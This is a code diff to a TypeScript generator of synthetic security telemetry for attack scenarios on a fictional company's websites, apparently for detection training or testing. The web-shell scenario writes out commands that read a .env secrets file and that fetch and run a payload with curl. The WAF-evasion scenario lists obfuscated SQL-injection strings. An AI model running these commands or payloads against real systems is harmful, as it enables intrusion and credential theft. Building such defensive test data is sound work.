@@ -37,6 +37,8 @@ export const clock = (iso: string) => { const b = Date.parse(iso); return (min: 
 export const asUser = (e: TelemetryEvent, user: string): TelemetryEvent => ({ ...e, process: e.process ? { ...e.process, user } : e.process });
 /** Context row: the approved change or request behind a look-alike. */
 export const ticket = (o: Parameters<typeof serviceNowRecord>[0]): TelemetryEvent => ({ ...serviceNowRecord(o), is_baseline: true });
+/** A byte count as a row description prints it (1,902). */
+export const bytesText = (n: number) => n.toLocaleString("en-US");
 
 const CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
 const SCANNER = "Mozilla/5.0 (compatible; ASV-Scanner/9.6; +https://scanner.example/about)";
@@ -120,7 +122,7 @@ function credentialStuffing(): TelemetryEvent[] {
     webAccess(w, { id: "web_cs_010", ts: T(36.3), srcIp: win, path: "/account/profile", query: "cid=771204", bytes: 6120, ua, mitre: "T1078", tactic: IA, description: "Portal answered a profile request" }),
     webAccess(w, { id: "web_cs_011", ts: T(37), srcIp: win, method: "POST", path: "/account/profile/email", query: "cid=771204", bytes: 288, ua, mitre: "T1098", tactic: PERSIST, severity: "medium", description: "Portal answered a profile change" }),
     webAccess(w, { id: "web_cs_012", ts: T(38), srcIp: win, path: "/account/documents/export", query: "cid=771204", bytes: 418220, ua, mitre: "T1213", tactic: COLLECT, severity: "medium", description: "Portal answered a document export" }),
-    login("web_cs_013", 41, win, 302, { mitre: "T1078", tactic: IA }),
+    login("web_cs_013", 41, win, 302, { query: "ReturnUrl=%2Faccount%2Fdocuments%2Fexport", mitre: "T1078", tactic: IA }),
     webAccess(w, { id: "web_cs_014", ts: T(41.4), srcIp: win, path: "/account/documents/export", query: "cid=690377", bytes: 396114, ua, mitre: "T1213", tactic: COLLECT, severity: "medium", description: "Portal answered a document export" }),
   ];
 }
@@ -194,13 +196,13 @@ function uploadShell(): TelemetryEvent[] {
     wafRequest(w, { id: "web_up_003", ts: T(48), srcIp: atk, method: "POST", path: "/account/avatar", action: "count", rule: "php_body", matched: "<?php", location: "REQUEST_BODY", ua, sent: 4210, bytes: 288, severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, description: "WAF rule matched PHP code in an upload" }),
     webAccess(w, { id: "web_up_004", ts: T(48.1), srcIp: atk, method: "POST", path: "/account/avatar", bytes: 288, sent: 4210, ua, mitre: "T1190", tactic: IA, description: "Members site answered an avatar upload" }),
     csFile({ id: "web_up_005", ts: T(48.1), ...host, path: `${root}${shell}`, size: 3896, actorProcess: "php-fpm8.2", actorPath: "/usr/sbin/php-fpm8.2", actorPid: 21902, runAsUser: "www-data", mitre: "T1505.003", tactic: PERSIST, severity: "medium", description: `File written under the web root on ${w.host}` }),
-    webAccess(w, { id: "web_up_006", ts: T(49), srcIp: atk, method: "POST", path: shell, bytes: 43, sent: 96, ua, mitre: "T1505.003", tactic: PERSIST, description: "Members site answered a request in the uploads folder" }),
+    webAccess(w, { id: "web_up_006", ts: T(49), srcIp: atk, method: "POST", path: shell, bytes: 43, sent: 96, ua, mitre: "T1505.003", tactic: PERSIST, description: "Members site answered a request in the uploads folder (96 bytes in, 43 bytes out)" }),
     sh("web_up_007", 49.1, 21977, "sh -c id", { isDetection: true, severity: "high", mitre: "T1059.004", tactic: EXEC }),
     sh("web_up_008", 51, 22014, "sh -c cat /var/www/members/.env", { mitre: "T1552.001", tactic: CRED, severity: "medium" }),
-    webAccess(w, { id: "web_up_009", ts: T(51), srcIp: atk, method: "POST", path: shell, bytes: 1902, sent: 512, ua, mitre: "T1505.003", tactic: PERSIST, description: "Members site answered a request in the uploads folder" }),
+    webAccess(w, { id: "web_up_009", ts: T(51), srcIp: atk, method: "POST", path: shell, bytes: 1902, sent: 512, ua, mitre: "T1505.003", tactic: PERSIST, description: "Members site answered a request in the uploads folder (512 bytes in, 1,902 bytes out)" }),
     sh("web_up_010", 53, 22061, `sh -c curl -s https://${mirror}/k -o /tmp/.k && chmod +x /tmp/.k`, { mitre: "T1105", tactic: C2, severity: "medium" }),
     panWeb({ id: "web_up_011", ts: T(53), host: w.host, user: null, srcIp: w.ip, url: `https://${mirror}/k`, domain: mirror, dstIp: "198.51.100.72", category: "unknown", action: "alert", userAgent: "curl/8.5.0", bytesIn: 2841200, severity: "medium", mitre: "T1105", tactic: C2, description: "Server downloaded a file from an uncategorized domain" }),
-    webAccess(w, { id: "web_up_013", ts: T(54.7), srcIp: atk, method: "POST", path: shell, bytes: 28, sent: 88, ua, mitre: "T1505.003", tactic: PERSIST, description: "Members site answered a request in the uploads folder" }),
+    webAccess(w, { id: "web_up_013", ts: T(54.7), srcIp: atk, method: "POST", path: shell, bytes: 28, sent: 88, ua, mitre: "T1505.003", tactic: PERSIST, description: "Members site answered a request in the uploads folder (88 bytes in, 28 bytes out)" }),
     sh("web_up_014", 54.8, 22090, "sh -c /tmp/.k", { mitre: "T1059.004", tactic: EXEC, severity: "medium" }),
     csProcess({ id: "web_up_015", ts: T(54.9), ...host, processName: ".k", processPath: "/tmp/.k", cmdline: "/tmp/.k", pid: 22107, parentName: "dash", parentPid: 22090, runAsUser: "www-data", sha256: payload, mitre: "T1059.004", tactic: EXEC, severity: "medium", description: `Process started on ${w.host}` }),
     asUser(csNetwork({ id: "web_up_012", ts: T(55), ...host, remoteIp: c2, remotePort: 443, processName: ".k", processPath: "/tmp/.k", cmdline: "/tmp/.k", pid: 22107, parentName: "dash", parentPid: 22090, sha256: payload, mitre: "T1071.001", tactic: C2, severity: "medium", description: `Outbound connection from ${w.host}` }), "www-data"),
@@ -216,7 +218,7 @@ function graphqlBatch(): TelemetryEvent[] {
   const atk = "203.0.113.151", ua = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
   const portal: WebSite = { site: "portal.nexacorp.com", host: "web-portal-04.nexacorp.com", ip: "10.20.40.62" };
   const app = "CustomerApp/5.2.0 (iOS 17.5)", nat = "198.51.100.152";
-  const post = (id: string, min: number, sent: number, bytes: number, extra = {}) => webAccess(w, { id, ts: T(min), srcIp: atk, method: "POST", path: "/graphql", sent, bytes, ua, description: "GraphQL endpoint answered a request", ...extra });
+  const post = (id: string, min: number, sent: number, bytes: number, extra = {}) => webAccess(w, { id, ts: T(min), srcIp: atk, method: "POST", path: "/graphql", sent, bytes, ua, description: `GraphQL endpoint answered a request (${bytesText(sent)} bytes in, ${bytesText(bytes)} bytes out)`, ...extra });
   return [
     wafRequest(w, { id: "web_gq_001", ts: T(3), srcIp: nat, method: "POST", path: "/graphql", action: "count", rule: "size_body", ua: app, sent: 9214, bytes: 41022, severity: "low", mitre: "T1110.001", tactic: CRED, verdict: "fp",
       fpExplanation: "The mobile app's home screen: a large query from a current app version, with a large response and no sign-in in it.", description: "WAF rule evaluated a large request body on the GraphQL endpoint" }),
@@ -244,8 +246,9 @@ function wafEvasion(): TelemetryEvent[] {
   const w: WebSite = { site: "shop.nexacorp.com", host: "web-shop-01.nexacorp.com", ip: "10.20.40.71" };
   const atk = "198.51.100.44", pen = "198.51.100.210", ua = PY, p = "/products", s = "/products/search", big = 142208;
   const blocked = (id: string, min: number, query: string, extra = {}) => wafRequest(w, { id, ts: T(min), srcIp: atk, path: p, query, action: "block", rule: "sqli_query", matched: "UNION SELECT", location: "ARGS:id", ua, severity: "medium", mitre: "T1190", tactic: IA, description: "WAF rule matched SQL syntax in the id parameter of /products", ...extra });
-  const passed = (id: string, min: number, bytes: number, extra = {}) => webAccess(w, { id, ts: T(min), srcIp: atk, method: "POST", path: s, sent: big, bytes, ua, mitre: "T1190", tactic: IA, description: "Shop answered a product search", ...extra });
-  const large = (id: string, min: number, bytes: number) => wafRequest(w, { id, ts: T(min), srcIp: atk, method: "POST", path: s, action: "count", rule: "size_body", oversizeBody: true, ua, sent: big, bytes, severity: "low", description: "WAF rule evaluated a large request body" });
+  // The padding is fixed; the SQL past it changes with each query, so every body has its own length.
+  const passed = (id: string, min: number, sent: number, bytes: number, extra = {}) => webAccess(w, { id, ts: T(min), srcIp: atk, method: "POST", path: s, sent, bytes, ua, mitre: "T1190", tactic: IA, description: `Shop answered a product search (${bytesText(sent)} bytes in, ${bytesText(bytes)} bytes out)`, ...extra });
+  const large = (id: string, min: number, sent: number, bytes: number) => wafRequest(w, { id, ts: T(min), srcIp: atk, method: "POST", path: s, action: "count", rule: "size_body", oversizeBody: true, ua, sent, bytes, severity: "low", description: `WAF rule evaluated a large request body (${bytesText(sent)} bytes)` });
   return [
     ticket({ id: "web_wf_001", ts: T(0), table: "change_request", number: "CHG0044263", state: "Implement", severity: "informational",
       shortDescription: "Annual web penetration test, source 198.51.100.210, this week", description: "ServiceNow change CHG0044263 (Implement): annual web penetration test" }),
@@ -257,12 +260,12 @@ function wafEvasion(): TelemetryEvent[] {
     blocked("web_wf_004", 44, "id=12+UNION+SELECT+NULL", { isDetection: true }),
     blocked("web_wf_005", 44.4, "id=12%20UnIoN%20SeLeCt%20NULL"),
     blocked("web_wf_006", 45, "id=12/**/UNION/**/SELECT/**/NULL"),
-    large("web_wf_007", 47, 8840),
-    passed("web_wf_008", 47, 8840, { mitre: "T1027", tactic: STEALTH }),
-    passed("web_wf_009", 48, 21904),
-    passed("web_wf_010", 51, 1940233, { mitre: "T1213", tactic: COLLECT, severity: "medium" }),
-    large("web_wf_011", 53, 6482112),
-    passed("web_wf_012", 53, 6482112, { mitre: "T1213", tactic: COLLECT, severity: "medium" }),
+    large("web_wf_007", 47, big, 8840),
+    passed("web_wf_008", 47, big, 8840, { mitre: "T1027", tactic: STEALTH }),
+    passed("web_wf_009", 48, big + 103, 21904),
+    passed("web_wf_010", 51, big + 278, 1940233, { mitre: "T1213", tactic: COLLECT, severity: "medium" }),
+    large("web_wf_011", 53, big + 319, 6482112),
+    passed("web_wf_012", 53, big + 319, 6482112, { mitre: "T1213", tactic: COLLECT, severity: "medium" }),
   ];
 }
 
